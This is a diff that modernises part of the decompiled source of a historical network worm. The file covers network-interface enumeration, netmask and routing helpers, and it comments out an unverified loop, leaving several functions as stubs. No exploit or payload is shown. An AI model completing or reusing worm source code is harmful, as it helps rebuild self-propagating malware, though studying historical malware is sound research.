@@ -7,12 +7,16 @@
 #include <sys/ioctl.h>
 #include <netinet/in.h>
 #include <net/if.h>
+#include <unistd.h>
+#include <string.h>
+
+static void rt_init_plus_544();
 
 /* This is the second of five source files linked together to form the '.o'
  * file distributed with the worm.
  */
 
-if_init()			/* 0x254c, check again */
+int if_init()			/* 0x254c, check again */
 {
     struct ifconf if_conf;
     struct ifreq if_buffer[12];
@@ -33,18 +37,18 @@ if_init()			/* 0x254c, check again */
     
     num_ifs = if_conf.ifc_len/sizeof(if_buffer[0]);
     for(i = 0; i < num_ifs; i++) {		/* if_init+144 */
-	for (j = 0; j < nifs; j++)
-	    /* Oops, look again.  This line needs verified. */
-	    if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
-		break;
+	for (j = 0; j < nifs; j++) {
+	    /* FIXME: Oops, look again.  This line needs verified. */
+	    // if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
+	    //     break;
+        }
     }
     
 }	
 
 /* Yes all of these are in the include file, but why bother?  Everyone knows
    netmasks, and they will never change... */
-def_netmask(net_addr)				/* 0x2962 */
-     int net_addr;
+int def_netmask(int net_addr)				/* 0x2962 */
 {
     if ((net_addr & 0x80000000) == 0)
 	return 0xFF000000;
@@ -53,8 +57,7 @@ def_netmask(net_addr)				/* 0x2962 */
     return 0xFFFFFF00;
 }
 
-netmaskfor(addr)				/* 0x29aa */
-     int addr;
+int netmaskfor(int addr)				/* 0x29aa */
 {
     int i, mask;
     
@@ -65,7 +68,7 @@ netmaskfor(addr)				/* 0x29aa */
     return mask;
 }
 
-rt_init()					/* 0x2a26 */
+int rt_init()					/* 0x2a26 */
 {
     FILE *pipe;
     char input_buf[64];
@@ -90,19 +93,20 @@ rt_init()					/* 0x2a26 */
     return 1;
 }						/* 540 */
 
-static rt_init_plus_544()				/* 0x2c44 */
+static void rt_init_plus_544()				/* 0x2c44 */
 {
 }
 
-getaddrs()					/* 0x2e1a */
+void getaddrs(struct hst *host) /* 0x2e1a */
 {
 }
 
-struct bar *a2in(a)		/* 0x2f4a, needs to be fixed */
+// FIXME:
+struct in_addr *a2in(a)		/* 0x2f4a, needs to be fixed */
      int a;
 {
-    static struct bar local;
-    local.baz = a;
+    static struct in_addr local;
+    local.s_addr = a;
     return &local;
 }
 
